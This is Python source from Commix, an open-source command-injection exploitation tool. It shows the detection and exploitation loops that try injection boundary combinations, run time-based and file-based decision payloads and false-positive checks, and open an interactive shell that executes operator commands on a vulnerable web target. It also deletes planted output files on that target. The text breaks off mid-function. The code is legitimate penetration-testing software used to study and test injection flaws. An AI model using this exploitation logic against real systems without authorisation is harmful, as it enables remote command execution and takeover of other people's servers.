#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2026 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

For more see the file 'readme/COPYING' for copying permission.
"""

import os
import re
import time
import string
import random
from src.utils import menu
from src.utils import logs
from src.utils import settings
from src.utils import common
from src.core.compat import xrange
from src.utils import session_handler
from src.core.requests import requests
from src.core.injections.controller import checks
from src.thirdparty.six.moves import urllib as _urllib
from src.core.injections.controller import shell_options
from src.thirdparty.six.moves import html_parser as _html_parser
from src.core.injections.controller import file_access
from src.core.injections.controller import enumeration
from src.core.injections.semiblind.techniques.tempfile_based import tfb_handler

"""
Move a value already confirmed working (by another technique) to the front of a candidate list.
"""
def _prioritize(candidates, confirmed_value):
  if confirmed_value in candidates:
    return [confirmed_value] + [c for c in candidates if c != confirmed_value]
  return candidates

"""
Put a boundary combo another technique already confirmed for this parameter first.
"""
def _prioritize_confirmed_boundary(prefixes, suffixes, separators, whitespaces):
  _boundary = settings.CONFIRMED_BOUNDARY.get(settings.CHECKING_PARAMETER)
  if _boundary:
    _b_prefix, _b_suffix, _b_separator, _b_whitespace = _boundary
    prefixes = _prioritize(prefixes, _b_prefix)
    suffixes = _prioritize(suffixes, _b_suffix)
    separators = _prioritize(separators, _b_separator)
    whitespaces = _prioritize(whitespaces, _b_whitespace)
  return prefixes, suffixes, separators, whitespaces

"""
Announce the technique about to be tested, re-checking tamper compatibility now that it and the target OS are known.
"""
def _announce_technique(injection_type, technique):
  settings.CURRENT_TECHNIQUE = technique
  checks.tamper_scripts(stored_tamper_scripts=True)
  checks.testing_technique_title(injection_type, technique)

"""
Register a post-detection action, run once at quit().
"""
def _register_post_detection_action(action, time_related_attack=None):
  if time_related_attack is None:
    time_related_attack = settings.TIME_RELATED_ATTACK
  def run():
    settings.TIME_RELATED_ATTACK = time_related_attack
    action()
  settings.PENDING_POST_DETECTION_ACTIONS.append(run)

"""
Register the single deferred --os-shell entry, run at quit().
"""
def _register_os_shell_entry(action, time_related_attack=None):
  if time_related_attack is None:
    time_related_attack = settings.TIME_RELATED_ATTACK
  def run():
    settings.TIME_RELATED_ATTACK = time_related_attack
    action()
  settings.PENDING_OS_SHELL_ENTRY = run

"""
Exit handler
"""
def exit_handler(no_result):
  if no_result:
    if settings.VERBOSITY_LEVEL == 0 and settings.LOAD_SESSION == None:
      if not settings.RESPONSE_DELAYS:
        settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
      else:
        settings.RESPONSE_DELAYS = False
    return False
  else :
    settings.print_data_to_stdout(settings.END_LINE.CR)

"""
Delete previous shells outputs.
"""
def delete_previous_shell(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, interpreter, filename, technique):
  if technique == settings.INJECTION_TECHNIQUE.FILE_BASED or technique == settings.INJECTION_TECHNIQUE.TEMP_FILE_BASED:
    if session_handler.check_file_deleted(url, technique, vuln_parameter, http_request_method):
      info_msg = "The file ('" + OUTPUT_TEXTFILE + "') used for command execution was already deleted from the target."
      settings.print_data_to_stdout(settings.print_info_msg(info_msg))
      return
    msg = "Do you want to delete from the target the file ('" + OUTPUT_TEXTFILE + "') used for command execution? [y/N] "
    if common.read_input(msg, default="N", check_batch=True) not in settings.CHOICE_YES:
      return
    if settings.VERBOSITY_LEVEL != 0:
      debug_msg = "Cleaning up the target operating system (i.e. deleting file '" + OUTPUT_TEXTFILE + "')."
      settings.print_data_to_stdout(settings.print_debug_msg(debug_msg))
    from src.core.injections.semiblind.techniques.file_based import fb_injector as injector
    if technique == settings.INJECTION_TECHNIQUE.FILE_BASED:
      if settings.TARGET_OS == settings.OS.WINDOWS:
        cmd = settings.WIN_DEL + settings.WEB_ROOT + OUTPUT_TEXTFILE
      else:
        cmd = settings.DEL + settings.WEB_ROOT + OUTPUT_TEXTFILE + settings.SINGLE_WHITESPACE + settings.COMMENT
    else:
      if settings.TARGET_OS == settings.OS.WINDOWS:
        cmd = settings.WIN_DEL + OUTPUT_TEXTFILE
      else:
        cmd = settings.DEL + OUTPUT_TEXTFILE + settings.SINGLE_WHITESPACE + settings.COMMENT
    injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, interpreter, filename, technique)
    session_handler.mark_file_deleted(url, technique, vuln_parameter, http_request_method)


"""
The shared interactive shell loop, dispatching command execution through the given execute_cmd(cmd) callback.
"""
def pseudo_terminal_shell_generic(url, filename, technique, no_result, execute_cmd, cleanup=lambda: None, on_found_declined=lambda: None, force_enter=False, separator=""):
  try:
    checks.alert()
    go_back = False
    go_back_again = False
    while True:
      if go_back == True:
        break
      # --os-shell opens later, at quit().
      if force_enter:
        gotshell = settings.CHOICE_YES[0]
      else:
        gotshell = settings.CHOICE_NO[0]
        if menu.options.os_shell and settings.PENDING_OS_SHELL_ENTRY is None:
          _register_os_shell_entry(lambda: pseudo_terminal_shell_generic(url, filename, technique, no_result, execute_cmd, cleanup, on_found_declined, force_enter=True, separator=separator))
      if gotshell in settings.CHOICE_YES:
        settings.DETECTION_PHASE = False
        settings.EXPLOITATION_PHASE = True
        info_msg = "Enabling the command shell."
        settings.print_data_to_stdout(settings.print_info_msg(info_msg))
        settings.print_data_to_stdout(settings.OS_SHELL_TITLE)
        info_msg = "Selected (default) mode: 'os_shell'."
        settings.print_data_to_stdout(settings.print_info_msg(info_msg))
        if settings.READLINE_ERROR:
          checks.no_readline_module()
        while True:
          if not settings.READLINE_ERROR:
            checks.tab_autocompleter()
          try:
            cmd = common.safe_input(settings.OS_SHELL)
            if len(cmd) == 0:
              cmd = "use os_shell"
            cmd = checks.escaped_cmd(cmd)
            if cmd.lower() in settings.SHELL_OPTIONS or cmd.lower().split(" ", 1)[0] == "use":
              if cmd.lower() == "quit" or cmd.lower() == "exit":
                cleanup()
              go_back, go_back_again = shell_options.check_option_generic(execute_cmd, cmd, go_back, go_back_again, filename, url, separator)
              if go_back and go_back_again == False:
                break
              if go_back and go_back_again:
                return True
            else:
              # execute_cmd() itself is responsible for logging the executed command.
              shell = execute_cmd(cmd)
              if shell:
                settings.print_data_to_stdout(settings.command_execution_output(shell))
              else:
                err_msg = common.invalid_cmd_output(cmd)
                settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
                if menu.options.abort_on_empty:
                  raise SystemExit()
          except KeyboardInterrupt:
            # Resume right back at the shell prompt - no need to re-ask to spawn one.
            checks.handle_exploitation_interrupt(filename, url)
            continue

      elif gotshell in settings.CHOICE_NO:
        # One combined question at the end, not per-technique.
        if no_result:
          return False
        on_found_declined()
        return True
      elif gotshell in settings.CHOICE_QUIT:
        cleanup()
        checks.quit(filename, url, hard_exit=False)
      else:
        common.invalid_option(gotshell)
        pass

  except KeyboardInterrupt:
    cleanup()
    checks.handle_exploitation_interrupt(filename, url)
    # Continue chosen - re-enter the shell fresh.
    return pseudo_terminal_shell_generic(url, filename, technique, no_result, execute_cmd, cleanup, on_found_declined=on_found_declined, separator=separator)

  except SystemExit:
    cleanup()
    settings.print_data_to_stdout(settings.END_LINE.CR)
    raise

  except EOFError:
    checks.EOFError_err_msg()
    cleanup()
    settings.print_data_to_stdout(settings.END_LINE.CR)
    # Return False to stop searching after this combination was already reported.
    return True

def pseudo_terminal_shell(injector, separator, maxlen, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, interpreter, filename, technique, no_result, timesec, payload, OUTPUT_TEXTFILE, url_time_response):
  def cleanup():
    if menu.options.os_shell and (technique == settings.INJECTION_TECHNIQUE.FILE_BASED or technique == settings.INJECTION_TECHNIQUE.TEMP_FILE_BASED):
      # Registered here, actually asked/run later at quit().
      settings.PENDING_FILE_CLEANUPS[OUTPUT_TEXTFILE] = lambda: delete_previous_shell(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, interpreter, filename, technique)

  def execute_cmd(cmd):
    time.sleep(timesec)
    _stored_shell = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
    if menu.options.ignore_session or not checks.usable_stored_cmd(_stored_shell):
      # The main command injection exploitation.
      if settings.TIME_RELATED_ATTACK:
        if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
          check_exec_time, shell = injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, interpreter, filename, url_time_response, technique)
        else:
          check_exec_time, shell = injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, interpreter, filename, url_time_response, technique)
        # Export injection result
        checks.time_related_export_injection_results(cmd, separator, shell, check_exec_time)
      else:
        if technique == settings.INJECTION_TECHNIQUE.FILE_BASED:
          response = injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, interpreter, filename, technique)
        else:
          response = injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, interpreter, filename, technique)
        # Command execution results.
        shell = injector.injection_results(response, TAG, cmd, technique, url, OUTPUT_TEXTFILE, timesec)
        shell = "".join(str(p) for p in shell)
      # Update logs with executed cmds and execution results.
      logs.executed_command(filename, cmd, shell)
      if shell and not menu.options.ignore_session:
        session_handler.store_cmd(url, cmd, shell, vuln_parameter)
    else:
      shell = _stored_shell
    return shell

  return pseudo_terminal_shell_generic(url, filename, technique, no_result, execute_cmd, cleanup, separator=separator)

"""
Retry value-skip using the confirmed exploit's own delay signal.
"""
def probe_skip_testable_value_post_detection(separator, timesec, http_request_method, url, vuln_parameter, whitespace, url_time_response, technique, prefix):
  if settings.TESTABLE_VALUE_OPTIMIZED or not settings.TESTABLE_VALUE:
    return url, prefix
  if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
    from src.core.injections.blind.techniques.time_based import tb_payloads as probe_payloads
  else:
    from src.core.injections.semiblind.techniques.tempfile_based import tfb_payloads as probe_payloads
  payload = probe_payloads.condition_check(separator, "1 -eq 1", timesec, http_request_method)
  if payload is None:
    return url, prefix

  marker = settings.TESTABLE_VALUE + settings.INJECT_TAG
  in_data = bool(menu.options.data) and marker in menu.options.data
  in_url = marker in url
  if not in_data and not in_url:
    return url, prefix

  from src.core.requests import stability
  placeholder = ''.join(random.choice(string.ascii_uppercase) for _ in range(3))
  original_data = menu.options.data
  original_url = url
  original_value = settings.TESTABLE_VALUE
  if in_data:
    menu.options.data = menu.options.data.replace(marker, placeholder + settings.INJECT_TAG)
  else:
    url = url.replace(marker, placeholder + settings.INJECT_TAG)
  settings.TESTABLE_VALUE = placeholder
  if settings.VERBOSITY_LEVEL != 0:
    debug_msg = "Replaying the delay against the random value '" + placeholder + "', to check if the real one is needed."
    settings.print_data_to_stdout(settings.print_debug_msg(debug_msg))
  try:
    before = settings.TOTAL_OF_REQUESTS
    exec_time, _, _, _, _ = requests.perform_injection("", "", whitespace, payload, vuln_parameter, http_request_method, url)
    succeeded = not stability.request_was_retried(before) and checks.time_related_shell(url_time_response, exec_time, timesec)
  except Exception:
    succeeded = False

  if not succeeded:
    menu.options.data = original_data
    settings.TESTABLE_VALUE = original_value
    return original_url, prefix

  settings.TESTABLE_VALUE_OPTIMIZED = True
  session_handler.import_testable_value_status(url, vuln_parameter, http_request_method, placeholder)
  if settings.VERBOSITY_LEVEL != 0:
    debug_msg = "The real parameter value isn't required. Skipping it for faster requests."
    settings.print_data_to_stdout(settings.print_debug_msg(debug_msg))
  # Reset the caller's own cached prefix - it still has the old value baked in.
  return url, ""

"""
The main Time-related exploitation process.
"""
def do_time_related_process(url, timesec, filename, http_request_method, url_time_response, injection_type, technique, tmp_path):

  resuming_stored = settings.LOAD_SESSION and technique in settings.STORED_TECHNIQUES
  if settings.THREADS > 1 and settings.THREADED_TIME_RETRIEVAL_CHOICE is None and not resuming_stored:
    msg = "Multi-threading is considered unsafe for time-related data retrieval. "
    msg += "Do you want to continue using threads anyway? [Y/n] "
    settings.THREADED_TIME_RETRIEVAL_CHOICE = common.read_input(msg, default="Y", check_batch=True) in settings.CHOICE_YES

  counter = 1
  num_of_chars = 1
  no_result = True
  possibly_vulnerable = False
  false_positive_warning = False
  exec_time = 0
  timesec = checks.time_related_timesec()

  if settings.TIME_RELATED_ATTACK == False:
    settings.TIME_RELATED_ATTACK = None

  # Check if defined "--url-reload" option.
  if menu.options.url_reload == True:
    checks.reload_url_msg(technique)

  # Check if defined "--maxlen" option.
  if menu.options.maxlen:
    settings.MAXLEN = maxlen = menu.options.maxlen

  if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
    from src.core.injections.blind.techniques.time_based import tb_injector as injector
    from src.core.injections.blind.techniques.time_based import tb_payloads as payloads
  else:
    from src.core.injections.semiblind.techniques.tempfile_based import tfb_injector as injector
    from src.core.injections.semiblind.techniques.tempfile_based import tfb_payloads as payloads

  if not settings.LOAD_SESSION or technique not in settings.STORED_TECHNIQUES:
    _announce_technique(injection_type, technique)

  prefixes = settings.PREFIXES
  suffixes = settings.SUFFIXES
  separators = settings.SEPARATORS
  whitespaces = settings.WHITESPACES

  prefixes, suffixes, separators, whitespaces = _prioritize_confirmed_boundary(prefixes, suffixes, separators, whitespaces)

  i = 0
  total = len(whitespaces) * len(prefixes) * len(suffixes) * len(separators)
  for whitespace in whitespaces:
    for prefix in prefixes:
      bare_prefix = prefix
      for suffix in suffixes:
        bare_suffix = suffix
        for separator in separators:
          # Check injection state
          settings.DETECTION_PHASE = True
          settings.EXPLOITATION_PHASE = False
          # If a previous session is available for this specific technique.
          exec_time_statistic = []
          resumed = False
          stored_row = settings.STORED_TECHNIQUES.get(technique) if settings.LOAD_SESSION else None
          if stored_row:
            try:
              url, technique, injection_type, separator, shell, vuln_parameter, prefix, suffix, TAG, interpreter, payload, http_request_method, url_time_response, timesec, exec_time, output_length, is_vulnerable = session_handler.apply_stored_technique(stored_row)
              url, prefix = session_handler.reapply_testable_value(url, vuln_parameter, http_request_method, prefix)
              # Re-apply the minimum safe delay to the stored session.
              if technique in (settings.INJECTION_TECHNIQUE.TIME_BASED, settings.INJECTION_TECHNIQUE.TEMP_FILE_BASED):
                timesec = max(timesec, settings.MIN_SAFE_TIMESEC)
              if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
                settings.TIME_BASED_STATE = True
              elif technique == settings.INJECTION_TECHNIQUE.TEMP_FILE_BASED:
                settings.TEMPFILE_BASED_STATE = True
                OUTPUT_TEXTFILE = injector.select_output_filename(technique, tmp_path, TAG, prompt=False)
              cmd = shell = output = ""
              checks.check_for_stored_tamper(payload)

              # Trust the stored session outright.
              settings.FOUND_EXEC_TIME = exec_time
              settings.FOUND_DIFF = exec_time - timesec
              possibly_vulnerable = True
              resumed = True
            except TypeError:
              checks.error_loading_session_file()

          if not resumed:
            num_of_chars = num_of_chars + 1
            # Retry the same separator once with a fresh TAG before moving to the next one.
            for _false_positive_retry in range(settings.FALSE_POSITIVE_RETRIES):
              # Check for bad combination of prefix and separator
              combination = prefix + separator
              if combination in settings.JUNK_COMBINATION:
                prefix = ""
              # Change TAG on every request to prevent false-positive resutls.
              TAG = ''.join(random.choice(string.ascii_uppercase) for num_of_chars in range(6))
              # The output file for file-based injection technique.
              interpreter = menu.options.interpreter
              tag_length = len(TAG) + 4
              OUTPUT_TEXTFILE = ""  # only used by TEMP_FILE_BASED, set just below
              if technique == settings.INJECTION_TECHNIQUE.TEMP_FILE_BASED:
                OUTPUT_TEXTFILE = injector.select_output_filename(technique, tmp_path, TAG)
              for output_length in range(1, int(tag_length)):
                try:
                  # Tempfile-based decision payload (check if host is vulnerable).
                  if interpreter:
                    if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
                      payload = payloads.decision_alter_interpreter(separator, TAG, output_length, timesec, http_request_method)
                    else:
                      payload = payloads.decision_alter_interpreter(separator, output_length, TAG, OUTPUT_TEXTFILE, timesec, http_request_method)
                  else:
                    if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
                      payload = payloads.decision(separator, TAG, output_length, timesec, http_request_method)
                    else:
                      payload = payloads.decision(separator, output_length, TAG, OUTPUT_TEXTFILE, timesec, http_request_method)

                  if not payload:
                    break

                  vuln_parameter = ""
                  exec_time, vuln_parameter, payload, prefix, suffix = requests.perform_injection(prefix, suffix, whitespace, payload, vuln_parameter, http_request_method, url)

                  # Statistical analysis in time responses.
                  exec_time_statistic.append(exec_time)
                  if not (num_of_chars >= total and no_result == True):
                    if checks.time_related_shell(url_time_response, exec_time, timesec):
                      # Time related false positive fixation.
                      false_positive_fixation = False
                      if len(TAG) == output_length:

                        statistical_anomaly = True
                        first_few = exec_time_statistic[0:5]
                        if first_few and max(first_few) - min(first_few) <= max(settings.MIN_VALID_DELAYED_RESPONSE, timesec * 0.5):
                          if max(xrange(len(exec_time_statistic)), key=lambda x: exec_time_statistic[x]) == len(TAG) - 1:
                            statistical_anomaly = False
                            exec_time_statistic = []

                        if timesec <= exec_time and not statistical_anomaly:
                          false_positive_fixation = True
                        else:
                          false_positive_warning = True

                      # Identified false positive warning message.
                      if false_positive_warning:
                        timesec, false_positive_fixation = checks.time_delay_due_to_unstable_request(timesec)

                      checks.injection_process(injection_type, technique, i=num_of_chars, total=total)

                      # Check if false positive fixation is True.
                      if false_positive_fixation:
                        false_positive_fixation = False
                        settings.FOUND_EXEC_TIME = exec_time
                        settings.FOUND_DIFF = exec_time - timesec
                        if false_positive_warning:
                          time.sleep(timesec)
                        randv1 = random.randrange(0, 4)
                        randv2 = random.randrange(1, 5)
                        randvcalc = randv1 + randv2

                        if settings.TARGET_OS == settings.OS.WINDOWS:
                          if interpreter:
                            cmd = settings.WIN_PYTHON_INTERPRETER + " -c \"print (" + str(randv1) + " + " + str(randv2) + ")\""
                          else:
                            rand_num = randv1 + randv2
                            cmd = "powershell.exe -InputFormat none write (" + str(rand_num) + ")"
                        else:
                          if technique == settings.INJECTION_TECHNIQUE.TIME_BASED or technique == settings.INJECTION_TECHNIQUE.TEMP_FILE_BASED:
                            cmd = "expr " + str(randv1) + " %2B " + str(randv2) + ""
                          else:
                            cmd = "echo $((" + str(randv1) + " %2B " + str(randv2) + "))"

                        # Set the original delay time
                        original_exec_time = exec_time

                        # Check for false positive resutls
                        if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
                          exec_time, output = injector.false_positive_check(separator, TAG, cmd, whitespace, prefix, suffix, timesec, http_request_method, url, vuln_parameter, randvcalc, interpreter, exec_time, url_time_response, false_positive_warning, technique, _false_positive_retry + 1, settings.FALSE_POSITIVE_RETRIES)
                        else:
                          exec_time, output = injector.false_positive_check(separator, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, randvcalc, interpreter, exec_time, url_time_response, false_positive_warning, technique, _false_positive_retry + 1, settings.FALSE_POSITIVE_RETRIES)

                        if checks.time_related_shell(url_time_response, exec_time, timesec):
                          if str(output) == str(randvcalc) and len(TAG) == output_length:
                            possibly_vulnerable = True
                            exec_time_statistic = 0
                        else:
                          break
                      # False positive
                      else:
                        checks.injection_process(injection_type, technique, i=num_of_chars, total=total)
                        continue
                    else:
                      # Feed the baseline model even during detection, not just later phases.
                      checks.record_baseline_response_time(exec_time)
                      checks.injection_process(injection_type, technique, i=num_of_chars, total=total)
                      continue

                except KeyboardInterrupt:
                  if technique == settings.INJECTION_TECHNIQUE.TEMP_FILE_BASED and 'cmd' in locals():
                    delete_previous_shell(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, interpreter, filename, technique)
                  # Always raises - propagates out to controller.injection_process().
                  checks.handle_detection_interrupt(filename, url)

                except SystemExit:
                  if technique == settings.INJECTION_TECHNIQUE.TEMP_FILE_BASED and 'cmd' in locals():
                    delete_previous_shell(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, interpreter, filename, technique)
                  raise

                except EOFError:
                  checks.EOFError_err_msg()
                  if technique == settings.INJECTION_TECHNIQUE.TEMP_FILE_BASED and 'cmd' in locals():
                    delete_previous_shell(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, interpreter, filename, technique)
                  raise

                except Exception:
                  if num_of_chars >= total:
                    if no_result == True:
                      checks.injection_process(injection_type, technique, done=True)
                    else:
                      settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
                break

              if possibly_vulnerable:
                break
          # Yaw, got shellz!
          # Do some magic tricks!
          if checks.time_related_shell(url_time_response, exec_time, timesec):
            if (len(TAG) == output_length) and (possibly_vulnerable == True or resumed and int(is_vulnerable) == settings.INJECTION_LEVEL):
              found = True
              no_result = False
              # Export session
              if not resumed:
                shell = ""
                checks.identified_vulnerable_param(url, technique, injection_type, vuln_parameter, payload, http_request_method, filename, counter, checks.finding_title(separator, whitespace, bare_prefix, bare_suffix))
                session_handler.import_injection_points(url, technique, injection_type, filename, separator, shell, vuln_parameter, prefix, suffix, TAG, interpreter, payload, http_request_method, url_time_response, timesec, original_exec_time, output_length, is_vulnerable=settings.INJECTION_LEVEL)
              else:
                whitespace = settings.WHITESPACES[0]
              if not resumed:
                settings.CONFIRMED_BOUNDARY[settings.CHECKING_PARAMETER] = (bare_prefix, bare_suffix, separator, whitespace)
              if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
                OUTPUT_TEXTFILE = ""
              url, prefix = probe_skip_testable_value_post_detection(separator, timesec, http_request_method, url, vuln_parameter, whitespace, url_time_response, technique, prefix)
              # Registered here, run once at quit().
              _register_post_detection_action(lambda: enumeration.stored_session(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, interpreter, filename, url_time_response, technique))
              _register_post_detection_action(lambda: file_access.stored_session(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, interpreter, filename, url_time_response, technique))
              if menu.options.os_cmd:
                def _run_os_cmd(separator=separator, maxlen=maxlen, TAG=TAG, cmd=menu.options.os_cmd, prefix=prefix, suffix=suffix, whitespace=whitespace, timesec=timesec, http_request_method=http_request_method, url=url, vuln_parameter=vuln_parameter, OUTPUT_TEXTFILE=OUTPUT_TEXTFILE, interpreter=interpreter, filename=filename, url_time_response=url_time_response, technique=technique, output=output):
                  if settings.OS_CMD_DONE:
                    return
                  settings.OS_CMD_DONE = True
                  enumeration.single_os_cmd_exec(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, interpreter, filename, url_time_response, technique)
                  if technique == settings.INJECTION_TECHNIQUE.TEMP_FILE_BASED and len(output) > 1:
                    delete_previous_shell(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, interpreter, filename, technique)
                _register_post_detection_action(_run_os_cmd)
              # Pseudo-Terminal shell
              if pseudo_terminal_shell(injector, separator, maxlen, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, interpreter, filename, technique, no_result, timesec, payload, OUTPUT_TEXTFILE, url_time_response) == None:
                continue
              else:
                return

  return exit_handler(no_result)
    
"""
The main results based exploitation process.
"""
def do_results_based_process(url, timesec, filename, http_request_method, injection_type, technique):

  shell = False
  counter = 1
  exit_loops = False
  no_result = True

  if technique == settings.INJECTION_TECHNIQUE.CLASSIC:
    try:
      import html
      unescape = html.unescape
    except:  # Python 2
      unescape = _html_parser.HTMLParser().unescape
    from src.core.injections.results_based.techniques.classic import cb_injector as injector
    from src.core.injections.results_based.techniques.classic import cb_payloads as payloads

  elif technique == settings.INJECTION_TECHNIQUE.DYNAMIC_CODE:
    from src.core.injections.results_based.techniques.eval_based import eb_injector as injector
    from src.core.injections.results_based.techniques.eval_based import eb_payloads as payloads
  else:
    from src.core.injections.semiblind.techniques.file_based import fb_injector as injector
    from src.core.injections.semiblind.techniques.file_based import fb_payloads as payloads

  # Calculate all possible combinations
  if technique == settings.INJECTION_TECHNIQUE.DYNAMIC_CODE:
    for item in range(0, len(settings.EXECUTION_FUNCTIONS)):
      settings.EXECUTION_FUNCTIONS[item] = "${" + settings.EXECUTION_FUNCTIONS[item] + "("
    settings.EVAL_PREFIXES = settings.EVAL_PREFIXES + settings.EXECUTION_FUNCTIONS
    prefixes = settings.EVAL_PREFIXES
    suffixes = settings.EVAL_SUFFIXES
    separators = settings.EVAL_SEPARATORS
  else:
    prefixes = settings.PREFIXES
    suffixes = settings.SUFFIXES
    separators = settings.SEPARATORS

  if not settings.LOAD_SESSION or technique not in settings.STORED_TECHNIQUES:
    _announce_technique(injection_type, technique)
    if technique == settings.INJECTION_TECHNIQUE.FILE_BASED:
      url_time_response = 0
      tmp_path = checks.check_tmp_path(url, timesec, filename, http_request_method, url_time_response)

  whitespaces = settings.WHITESPACES

  prefixes, suffixes, separators, whitespaces = _prioritize_confirmed_boundary(prefixes, suffixes, separators, whitespaces)

  TAG = ''.join(random.choice(string.ascii_uppercase) for i in range(6))
  i = 0
  total = len(whitespaces) * len(prefixes) * len(suffixes) * len(separators)
  for whitespace in whitespaces:
    for prefix in prefixes:
      bare_prefix = prefix
      for suffix in suffixes:
        bare_suffix = suffix
        for separator in separators:
          if whitespace == settings.SINGLE_WHITESPACE:
            whitespace = _urllib.parse.quote(whitespace)
          # Check injection state
          settings.DETECTION_PHASE = True
          settings.EXPLOITATION_PHASE = False
          # If a previous session is available for this specific technique.
          resumed = False
          stored_row = settings.STORED_TECHNIQUES.get(technique) if settings.LOAD_SESSION else None
          if stored_row:
            try:
              url, technique, injection_type, separator, shell, vuln_parameter, prefix, suffix, TAG, interpreter, payload, http_request_method, url_time_response, timesec, exec_time, output_length, is_vulnerable = session_handler.apply_stored_technique(stored_row)
              url, prefix = session_handler.reapply_testable_value(url, vuln_parameter, http_request_method, prefix)
              if technique == settings.INJECTION_TECHNIQUE.FILE_BASED:
                settings.FILE_BASED_STATE = True
                checks.check_for_stored_tamper(payload)
                tmp_path = ""
                OUTPUT_TEXTFILE = injector.select_output_filename(technique, tmp_path, TAG, prompt=False)
                if re.findall(settings.DIRECTORY_REGEX,payload):
                  filepath = re.findall(settings.DIRECTORY_REGEX,payload)[0]
                  settings.WEB_ROOT = os.path.dirname(filepath)
                  settings.CUSTOM_WEB_ROOT = True
                tmp_path = checks.check_tmp_path(url, timesec, filename, http_request_method, url_time_response)
              elif technique == settings.INJECTION_TECHNIQUE.TEMP_FILE_BASED:
                tfb_handler.exploitation(url, timesec, filename, tmp_path, http_request_method, url_time_response)
              else:
                if technique == settings.INJECTION_TECHNIQUE.CLASSIC:
                  settings.CLASSIC_STATE = True
                elif technique == settings.INJECTION_TECHNIQUE.DYNAMIC_CODE:
                  settings.EVAL_BASED_STATE = True
                checks.check_for_stored_tamper(payload)
              resumed = True
            except TypeError:
              checks.error_loading_session_file()

          if not resumed:
            i = i + 1
            # Check for bad combination of prefix and separator
            combination = prefix + separator
            if combination in settings.JUNK_COMBINATION:
              prefix = ""

            if technique == settings.INJECTION_TECHNIQUE.FILE_BASED:
              # The output file for file-based injection technique.
              OUTPUT_TEXTFILE = injector.select_output_filename(technique, tmp_path, TAG)
            else:
              randv1 = random.randrange(100)
              randv2 = random.randrange(100)
              randvcalc = randv1 + randv2

            # Define alternative interpreter
            interpreter = menu.options.interpreter
            try:
              # File-based decision payload (check if host is vulnerable).
              if interpreter:
                if technique == settings.INJECTION_TECHNIQUE.FILE_BASED:
                  payload = payloads.decision_alter_interpreter(separator, TAG, OUTPUT_TEXTFILE)
                else:
                  payload = payloads.decision_alter_interpreter(separator, TAG, randv1, randv2)
              else:
                if technique == settings.INJECTION_TECHNIQUE.FILE_BASED:
                  payload = payloads.decision(separator, TAG, OUTPUT_TEXTFILE)
                else:
                  # Classic decision payload (check if host is vulnerable).
                  payload = payloads.decision(separator, TAG, randv1, randv2)

              vuln_parameter = ""
              response, vuln_parameter, payload, prefix, suffix = requests.perform_injection(prefix, suffix, whitespace, payload, vuln_parameter, http_request_method, url)
              if technique != settings.INJECTION_TECHNIQUE.FILE_BASED:
                # Try target page reload (if it is required).
                if settings.URL_RELOAD:
                  response = requests.url_reload(url, timesec)
                # Evaluate test results.
                time.sleep(timesec)
                shell = injector.injection_test_results(response, TAG, randvcalc, technique, payload)
                done = bool(shell) or (no_result and i >= total)
                checks.injection_process(injection_type, technique, done=done, i=i, total=total)
              else:
                try:
                  time.sleep(timesec)
                  output = injector.injection_output(url, OUTPUT_TEXTFILE, timesec, technique)
                  response = checks.get_response(output)
                  if type(response) is bool:
                    html_data = ""
                  else:
                    html_data = checks.process_page_content(response, action="decode")
                  shell = re.findall(r"" + TAG + "", str(html_data))
                  if len(shell) == 0 :
                    raise _urllib.error.HTTPError(url, int(settings.NOT_FOUND_ERROR), 'Error', {}, None)
                  else:
                    if shell[0] == TAG:
                      checks.injection_process(injection_type, technique, done=True)

                except _urllib.error.HTTPError as e:
                  if str(e.getcode()) == settings.NOT_FOUND_ERROR:
                    if settings.CALL_TMP_BASED == True:
                      exit_loops = True
                      dest_dir = os.path.dirname(menu.options.file_dest.replace("\\", "/"))
                      tmp_path = checks.normalize_target_dir(dest_dir)
                      checks.tfb_controller(no_result, url, timesec, filename, tmp_path, http_request_method, url_time_response)
                      raise
                    # Show an error message, after N failed tries.
                    # Use the "/tmp/" directory for tempfile-based technique.
                    elif (i == int(menu.options.failed_tries) and no_result == True) or (i == total):
                      if i == total:
